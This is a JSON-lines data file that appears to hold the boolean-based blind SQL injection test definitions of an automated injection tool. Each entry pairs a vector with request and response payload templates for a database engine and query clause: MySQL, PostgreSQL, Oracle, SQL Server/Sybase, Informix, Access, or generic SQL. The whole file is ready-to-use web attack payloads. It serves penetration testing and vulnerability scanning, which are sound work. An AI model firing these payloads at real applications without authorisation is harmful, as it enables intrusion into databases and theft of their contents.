{"title": "AND boolean-based blind - WHERE or HAVING clause", "stype": 1, "level": 1, "risk": 1, "clause": [1, 8, 9], "where": [1], "vector": "AND [INFERENCE]", "request": {"payload": "AND [RANDNUM]=[RANDNUM]"}, "response": {"comparison": "AND [RANDNUM]=[RANDNUM1]"}}
{"title": "OR boolean-based blind - WHERE or HAVING clause", "stype": 1, "level": 1, "risk": 3, "clause": [1, 9], "where": [2], "vector": "OR [INFERENCE]", "request": {"payload": "OR [RANDNUM]=[RANDNUM]"}, "response": {"comparison": "OR [RANDNUM]=[RANDNUM1]"}}
{"title": "OR boolean-based blind - WHERE or HAVING clause (NOT)", "stype": 1, "level": 3, "risk": 3, "clause": [1, 9], "where": [1], "vector": "OR NOT [INFERENCE]", "request": {"payload": "OR NOT [RANDNUM]=[RANDNUM]"}, "response": {"comparison": "OR NOT [RANDNUM]=[RANDNUM1]"}}
{"title": "AND boolean-based blind - WHERE or HAVING clause (subquery - comment)", "stype": 1, "level": 2, "risk": 1, "clause": [1, 8, 9], "where": [1], "vector": "AND [RANDNUM]=(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))", "request": {"payload": "AND [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))", "comment": "[GENERIC_SQL_COMMENT]"}, "response": {"comparison": "AND [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))"}}
{"title": "OR boolean-based blind - WHERE or HAVING clause (subquery - comment)", "stype": 1, "level": 2, "risk": 3, "clause": [1, 9], "where": [2], "vector": "OR [RANDNUM]=(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))", "request": {"payload": "OR [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))", "comment": "[GENERIC_SQL_COMMENT]"}, "response": {"comparison": "OR [RANDNUM]=(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))"}}
{"title": "AND boolean-based blind - WHERE or HAVING clause (comment)", "stype": 1, "level": 2, "risk": 1, "clause": [1], "where": [1], "vector": "AND [INFERENCE]", "request": {"payload": "AND [RANDNUM]=[RANDNUM]", "comment": "[GENERIC_SQL_COMMENT]"}, "response": {"comparison": "AND [RANDNUM]=[RANDNUM1]"}}
{"title": "OR boolean-based blind - WHERE or HAVING clause (comment)", "stype": 1, "level": 2, "risk": 3, "clause": [1], "where": [2], "vector": "OR [INFERENCE]", "request": {"payload": "OR [RANDNUM]=[RANDNUM]", "comment": "[GENERIC_SQL_COMMENT]"}, "response": {"comparison": "OR [RANDNUM]=[RANDNUM1]"}}
{"title": "OR boolean-based blind - WHERE or HAVING clause (NOT - comment)", "stype": 1, "level": 4, "risk": 3, "clause": [1], "where": [1], "vector": "OR NOT [INFERENCE]", "request": {"payload": "OR NOT [RANDNUM]=[RANDNUM]", "comment": "[GENERIC_SQL_COMMENT]"}, "response": {"comparison": "OR NOT [RANDNUM]=[RANDNUM1]"}}
{"title": "AND boolean-based blind - WHERE or HAVING clause (MySQL comment)", "stype": 1, "level": 3, "risk": 1, "clause": [1], "where": [1], "vector": "AND [INFERENCE]", "request": {"payload": "AND [RANDNUM]=[RANDNUM]", "comment": "#"}, "response": {"comparison": "AND [RANDNUM]=[RANDNUM1]"}, "details": {"dbms": "MySQL"}}
{"title": "OR boolean-based blind - WHERE or HAVING clause (MySQL comment)", "stype": 1, "level": 3, "risk": 3, "clause": [1], "where": [2], "vector": "OR [INFERENCE]", "request": {"payload": "OR [RANDNUM]=[RANDNUM]", "comment": "#"}, "response": {"comparison": "OR [RANDNUM]=[RANDNUM1]"}, "details": {"dbms": "MySQL"}}
{"title": "OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)", "stype": 1, "level": 3, "risk": 3, "clause": [1], "where": [1], "vector": "OR NOT [INFERENCE]", "request": {"payload": "OR NOT [RANDNUM]=[RANDNUM]", "comment": "#"}, "response": {"comparison": "OR NOT [RANDNUM]=[RANDNUM1]"}, "details": {"dbms": "MySQL"}}
{"title": "AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)", "stype": 1, "level": 3, "risk": 1, "clause": [1], "where": [1], "vector": "AND [INFERENCE]", "request": {"payload": "AND [RANDNUM]=[RANDNUM]", "comment": "%16"}, "response": {"comparison": "AND [RANDNUM]=[RANDNUM1]"}, "details": {"dbms": "Microsoft Access"}}
{"title": "OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)", "stype": 1, "level": 3, "risk": 3, "clause": [1], "where": [2], "vector": "OR [INFERENCE]", "request": {"payload": "OR [RANDNUM]=[RANDNUM]", "comment": "%16"}, "response": {"comparison": "OR [RANDNUM]=[RANDNUM1]"}, "details": {"dbms": "Microsoft Access"}}
{"title": "MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause", "stype": 1, "level": 2, "risk": 1, "clause": [1, 2, 3], "where": [1], "vector": "RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0x28 END))", "request": {"payload": "RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 0x28 END))"}, "response": {"comparison": "RLIKE (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 0x28 END))"}, "details": {"dbms": "MySQL"}}
{"title": "MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)", "stype": 1, "level": 3, "risk": 1, "clause": [1, 2, 3, 8], "where": [1], "vector": "AND MAKE_SET([INFERENCE],[RANDNUM])", "request": {"payload": "AND MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1])"}, "response": {"comparison": "AND MAKE_SET([RANDNUM]=[RANDNUM1],[RANDNUM1])"}, "details": {"dbms": "MySQL"}}
{"title": "MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)", "stype": 1, "level": 3, "risk": 3, "clause": [1, 2, 3], "where": [2], "vector": "OR MAKE_SET([INFERENCE],[RANDNUM])", "request": {"payload": "OR MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1])"}, "response": {"comparison": "OR MAKE_SET([RANDNUM]=[RANDNUM1],[RANDNUM1])"}, "details": {"dbms": "MySQL"}}
{"title": "MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)", "stype": 1, "level": 4, "risk": 1, "clause": [1, 2, 3, 8], "where": [1], "vector": "AND ELT([INFERENCE],[RANDNUM])", "request": {"payload": "AND ELT([RANDNUM]=[RANDNUM],[RANDNUM1])"}, "response": {"comparison": "AND ELT([RANDNUM]=[RANDNUM1],[RANDNUM1])"}, "details": {"dbms": "MySQL"}}
{"title": "MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)", "stype": 1, "level": 4, "risk": 3, "clause": [1, 2, 3], "where": [2], "vector": "OR ELT([INFERENCE],[RANDNUM])", "request": {"payload": "OR ELT([RANDNUM]=[RANDNUM],[RANDNUM1])"}, "response": {"comparison": "OR ELT([RANDNUM]=[RANDNUM1],[RANDNUM1])"}, "details": {"dbms": "MySQL"}}
{"title": "MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)", "stype": 1, "level": 5, "risk": 1, "clause": [1, 2, 3, 8], "where": [1], "vector": "AND ([INFERENCE])*[RANDNUM]", "request": {"payload": "AND ([RANDNUM]=[RANDNUM])*[RANDNUM1]"}, "response": {"comparison": "AND ([RANDNUM]=[RANDNUM1])*[RANDNUM1]"}, "details": {"dbms": "MySQL"}}
{"title": "MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)", "stype": 1, "level": 5, "risk": 3, "clause": [1, 2, 3], "where": [2], "vector": "OR ([INFERENCE])*[RANDNUM]", "request": {"payload": "OR ([RANDNUM]=[RANDNUM])*[RANDNUM1]"}, "response": {"comparison": "OR ([RANDNUM]=[RANDNUM1])*[RANDNUM1]"}, "details": {"dbms": "MySQL"}}
{"title": "PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)", "stype": 1, "level": 2, "risk": 1, "clause": [1, 8], "where": [1], "vector": "AND (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL", "request": {"payload": "AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL"}, "response": {"comparison": "AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL"}, "details": {"dbms": "PostgreSQL"}}
{"title": "PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)", "stype": 1, "level": 3, "risk": 3, "clause": [1], "where": [2], "vector": "OR (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL", "request": {"payload": "OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL"}, "response": {"comparison": "OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL"}, "details": {"dbms": "PostgreSQL"}}
{"title": "Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)", "stype": 1, "level": 2, "risk": 1, "clause": [1], "where": [1], "vector": "AND (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL", "request": {"payload": "AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL"}, "response": {"comparison": "AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL"}, "details": {"dbms": "Oracle"}}
{"title": "Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)", "stype": 1, "level": 3, "risk": 3, "clause": [1], "where": [2], "vector": "OR (SELECT (CASE WHEN ([INFERENCE]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL", "request": {"payload": "OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL"}, "response": {"comparison": "OR (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL"}, "details": {"dbms": "Oracle"}}
{"title": "Boolean-based blind - Parameter replace (original value)", "stype": 1, "level": 1, "risk": 1, "clause": [1, 2, 3], "where": [3], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))", "request": {"payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))"}, "response": {"comparison": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))"}}
{"title": "MySQL boolean-based blind - Parameter replace (MAKE_SET)", "stype": 1, "level": 4, "risk": 1, "clause": [1, 2, 3], "where": [3], "vector": "MAKE_SET([INFERENCE],[RANDNUM])", "request": {"payload": "MAKE_SET([RANDNUM]=[RANDNUM],[RANDNUM1])"}, "response": {"comparison": "MAKE_SET([RANDNUM]=[RANDNUM1],[RANDNUM1])"}, "details": {"dbms": "MySQL"}}
{"title": "MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)", "stype": 1, "level": 5, "risk": 1, "clause": [1, 2, 3], "where": [3], "vector": "MAKE_SET([INFERENCE],[ORIGVALUE])", "request": {"payload": "MAKE_SET([RANDNUM]=[RANDNUM],[ORIGVALUE])"}, "response": {"comparison": "MAKE_SET([RANDNUM]=[RANDNUM1],[ORIGVALUE])"}, "details": {"dbms": "MySQL"}}
{"title": "MySQL boolean-based blind - Parameter replace (ELT)", "stype": 1, "level": 4, "risk": 1, "clause": [1, 2, 3], "where": [3], "vector": "ELT([INFERENCE],[RANDNUM])", "request": {"payload": "ELT([RANDNUM]=[RANDNUM],[RANDNUM1])"}, "response": {"comparison": "ELT([RANDNUM]=[RANDNUM1],[RANDNUM1])"}, "details": {"dbms": "MySQL"}}
{"title": "MySQL boolean-based blind - Parameter replace (ELT - original value)", "stype": 1, "level": 5, "risk": 1, "clause": [1, 2, 3], "where": [3], "vector": "ELT([INFERENCE],[ORIGVALUE])", "request": {"payload": "ELT([RANDNUM]=[RANDNUM],[ORIGVALUE])"}, "response": {"comparison": "ELT([RANDNUM]=[RANDNUM1],[ORIGVALUE])"}, "details": {"dbms": "MySQL"}}
{"title": "MySQL boolean-based blind - Parameter replace (bool*int)", "stype": 1, "level": 4, "risk": 1, "clause": [1, 2, 3], "where": [3], "vector": "([INFERENCE])*[RANDNUM]", "request": {"payload": "([RANDNUM]=[RANDNUM])*[RANDNUM1]"}, "response": {"comparison": "([RANDNUM]=[RANDNUM1])*[RANDNUM1]"}, "details": {"dbms": "MySQL"}}
{"title": "MySQL boolean-based blind - Parameter replace (bool*int - original value)", "stype": 1, "level": 5, "risk": 1, "clause": [1, 2, 3], "where": [3], "vector": "([INFERENCE])*[ORIGVALUE]", "request": {"payload": "([RANDNUM]=[RANDNUM])*[ORIGVALUE]"}, "response": {"comparison": "([RANDNUM]=[RANDNUM1])*[ORIGVALUE]"}, "details": {"dbms": "MySQL"}}
{"title": "PostgreSQL boolean-based blind - Parameter replace", "stype": 1, "level": 3, "risk": 1, "clause": [1, 2, 3], "where": [3], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 1/(SELECT 0) END))", "request": {"payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/(SELECT 0) END))"}, "response": {"comparison": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 1/(SELECT 0) END))"}, "details": {"dbms": "PostgreSQL"}}
{"title": "PostgreSQL boolean-based blind - Parameter replace (original value)", "stype": 1, "level": 4, "risk": 1, "clause": [1, 2, 3], "where": [3], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))", "request": {"payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))"}, "response": {"comparison": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))"}, "details": {"dbms": "PostgreSQL"}}
{"title": "PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)", "stype": 1, "level": 5, "risk": 1, "clause": [1, 2, 3], "where": [3], "vector": "(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END) LIMIT 1)", "request": {"payload": "(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)"}, "response": {"comparison": "(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 0 END) LIMIT 1)"}, "details": {"dbms": "PostgreSQL"}}
{"title": "PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)", "stype": 1, "level": 5, "risk": 1, "clause": [1, 2, 3], "where": [3], "vector": "(SELECT [ORIGVALUE] FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([INFERENCE]) THEN 1 ELSE 0 END) LIMIT 1)", "request": {"payload": "(SELECT [ORIGVALUE] FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)"}, "response": {"comparison": "(SELECT [ORIGVALUE] FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 0 END) LIMIT 1)"}, "details": {"dbms": "PostgreSQL"}}
{"title": "Microsoft SQL Server/Sybase boolean-based blind - Parameter replace", "stype": 1, "level": 3, "risk": 1, "clause": [1, 3], "where": [3], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))", "request": {"payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))"}, "response": {"comparison": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))"}, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}
{"title": "Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)", "stype": 1, "level": 4, "risk": 1, "clause": [1, 3], "where": [3], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))", "request": {"payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))"}, "response": {"comparison": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))"}, "details": {"dbms": ["Microsoft SQL Server", "Sybase"], "os": "Windows"}}
{"title": "Oracle boolean-based blind - Parameter replace", "stype": 1, "level": 3, "risk": 1, "clause": [1, 3], "where": [3], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)", "request": {"payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)"}, "response": {"comparison": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)"}, "details": {"dbms": "Oracle"}}
{"title": "Oracle boolean-based blind - Parameter replace (original value)", "stype": 1, "level": 4, "risk": 1, "clause": [1, 3], "where": [3], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)", "request": {"payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)"}, "response": {"comparison": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)"}, "details": {"dbms": "Oracle"}}
{"title": "Informix boolean-based blind - Parameter replace", "stype": 1, "level": 3, "risk": 1, "clause": [1, 3], "where": [3], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)", "request": {"payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)"}, "response": {"comparison": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)"}, "details": {"dbms": "Informix"}}
{"title": "Informix boolean-based blind - Parameter replace (original value)", "stype": 1, "level": 4, "risk": 1, "clause": [1, 3], "where": [3], "vector": "(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM] END) FROM SYSMASTER:SYSDUAL)", "request": {"payload": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM] END) FROM SYSMASTER:SYSDUAL)"}, "response": {"comparison": "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM] END) FROM SYSMASTER:SYSDUAL)"}, "details": {"dbms": "Informix"}}
{"title": "Microsoft Access boolean-based blind - Parameter replace", "stype": 1, "level": 3, "risk": 1, "clause": [1, 3], "where": [3], "vector": "IIF([INFERENCE],[RANDNUM],1/0)", "request": {"payload": "IIF([RANDNUM]=[RANDNUM],[RANDNUM],1/0)"}, "response": {"comparison": "IIF([RANDNUM]=[RANDNUM1],[RANDNUM],1/0)"}, "details": {"dbms": "Microsoft Access"}}
{"title": "Microsoft Access boolean-based blind - Parameter replace (original value)", "stype": 1, "level": 4, "risk": 1, "clause": [1, 3], "where": [3], "vector": "IIF([INFERENCE],[ORIGVALUE],1/0)", "request": {"payload": "IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0)"}, "response": {"comparison": "IIF([RANDNUM]=[RANDNUM1],[ORIGVALUE],1/0)"}, "details": {"dbms": "Microsoft Access"}}
{"title": "Boolean-based blind - Parameter replace (DUAL)", "stype": 1, "level": 2, "risk": 1, "clause": [1, 2, 3], "where": [3], "vector": "(CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)", "request": {"payload": "(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)"}, "response": {"comparison": "(CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)"}}
{"title": "Boolean-based blind - Parameter replace (DUAL - original value)", "stype": 1, "level": 3, "risk": 1, "clause": [1, 2, 3], "where": [3], "vector": "(CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)", "request": {"payload": "(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)"}, "response": {"comparison": "(CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)"}}
{"title": "Boolean-based blind - Parameter replace (CASE)", "stype": 1, "level": 2, "risk": 1, "clause": [1, 3], "where": [3], "vector": "(CASE WHEN [INFERENCE] THEN [RANDNUM] ELSE NULL END)", "request": {"payload": "(CASE WHEN [RANDNUM]=[RANDNUM] THEN [RANDNUM] ELSE NULL END)"}, "response": {"comparison": "(CASE WHEN [RANDNUM]=[RANDNUM1] THEN [RANDNUM] ELSE NULL END)"}}
{"title": "Boolean-based blind - Parameter replace (CASE - original value)", "stype": 1, "level": 3, "risk": 1, "clause": [1, 3], "where": [3], "vector": "(CASE WHEN [INFERENCE] THEN [ORIGVALUE] ELSE NULL END)", "request": {"payload": "(CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE NULL END)"}, "response": {"comparison": "(CASE WHEN [RANDNUM]=[RANDNUM1] THEN [ORIGVALUE] ELSE NULL END)"}}
{"title": "MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause", "stype": 1, "level": 2, "risk": 1, "clause": [2, 3], "where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))"}, "response": {"comparison": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0"}}
{"title": "MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)", "stype": 1, "level": 3, "risk": 1, "clause": [2, 3], "where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))"}, "response": {"comparison": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))"}, "details": {"dbms": "MySQL", "dbms_version": ">= 5.0"}}
{"title": "MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause", "stype": 1, "level": 3, "risk": 1, "clause": [2, 3], "where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))"}, "response": {"comparison": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))"}, "details": {"dbms": "MySQL", "dbms_version": "< 5.0"}}
{"title": "MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)", "stype": 1, "level": 4, "risk": 1, "clause": [2, 3], "where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))"}, "response": {"comparison": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))"}, "details": {"dbms": "MySQL", "dbms_version": "< 5.0"}}
{"title": "PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause", "stype": 1, "level": 2, "risk": 1, "clause": [2, 3], "where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE 1/(SELECT 0) END))", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 1/(SELECT 0) END))"}, "response": {"comparison": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 1/(SELECT 0) END))"}, "details": {"dbms": "PostgreSQL"}}
{"title": "PostgreSQL boolean-based blind - ORDER BY clause (original value)", "stype": 1, "level": 4, "risk": 1, "clause": [3], "where": [1], "vector": ",(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))", "request": {"payload": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))"}, "response": {"comparison": ",(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))"}, "details": {"dbms": "PostgreSQL"}}
